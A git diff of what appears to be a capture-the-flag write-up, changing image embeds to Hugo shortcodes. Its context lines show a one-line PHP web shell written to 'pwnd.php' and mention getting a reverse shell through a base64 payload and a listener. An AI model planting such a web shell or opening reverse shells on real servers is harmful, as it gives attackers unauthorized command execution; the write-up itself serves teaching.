@@ -160,7 +160,7 @@ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > pwnd.php
 
 Navigating to the website we can see that the shell worked!
 
-![[Pasted image 20221212181527.png]]
+{{< image src="img/Pasted image 20221212181527.png" alt="Initial WebShell" position="center" style="border-radius: 8px;" >}}
 
 Now that we have command execution, lets go for a reverse shell.
 
@@ -185,7 +185,8 @@ navigating back to the site, and using our payload put (you must replace the b64
 
 Looking back at our listener you should see this:
 
-![[Pasted image 20221212183603.png]]
+{{< image src="img/Pasted image 20221212183603.png" alt="RevShell" position="center" style="border-radius: 8px;" >}}
+
 Cool! now we have a shell on the box!
 
 *you can upgrade your shell using* 
